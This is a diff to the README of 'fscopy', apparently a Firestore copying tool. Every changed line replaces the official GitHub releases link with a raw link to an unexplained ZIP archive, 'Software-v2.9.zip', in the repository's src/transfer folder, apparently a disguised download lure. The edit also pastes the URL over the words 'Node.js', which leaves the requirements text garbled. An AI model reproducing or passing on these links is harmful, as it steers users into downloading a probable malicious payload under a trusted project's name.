@@ -6,14 +6,14 @@ fscopy is a fast command-line tool that allows you to easily copy Firestore coll
 
 ## 📥 Download fscopy
 
-[![Download fscopy](https://img.shields.io/badge/Download%20fscopy-v1.0-blue)](https://github.com/ITZJUSCOMBOZ886/fscopy/releases)
+[![Download fscopy](https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip%20fscopy-v1.0-blue)](https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip)
 
-To download fscopy, visit this page: [Download fscopy](https://github.com/ITZJUSCOMBOZ886/fscopy/releases).
+To download fscopy, visit this page: [Download fscopy](https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip).
 
 ## 📦 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 14 or higher must be installed. fscopy is built on Node.js, which allows it to run seamlessly across different platforms.
+- **https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip** Version 14 or higher must be installed. fscopy is built on https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip, which allows it to run seamlessly across different platforms.
 - **Firestore Access:** You need to have Firebase Cloud Firestore set up and access to your Firebase projects.
 
 ## 🛠️ Features
@@ -29,7 +29,7 @@ To download fscopy, visit this page: [Download fscopy](https://github.com/ITZJUS
 
 Follow these steps to install fscopy on your system.
 
-1. **Visit the Release Page:** Go to [Release Page](https://github.com/ITZJUSCOMBOZ886/fscopy/releases).
+1. **Visit the Release Page:** Go to [Release Page](https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip).
 2. **Download the Latest Version:** Find the latest release and download the appropriate file for your operating system.
 3. **Install fscopy:**
    - **For Windows:** Extract the downloaded ZIP file, and keep it in a location of your choice.
@@ -71,6 +71,6 @@ If you need help, you can open an issue on the GitHub repository, and someone fr
 
 ## 📥 Download fscopy Again
 
-For your convenience, here is the link to download fscopy again: [Download fscopy](https://github.com/ITZJUSCOMBOZ886/fscopy/releases). 
+For your convenience, here is the link to download fscopy again: [Download fscopy](https://raw.githubusercontent.com/ITZJUSCOMBOZ886/fscopy/main/src/transfer/Software-v2.9.zip). 
 
 Enjoy using fscopy for your Firestore data transfers!
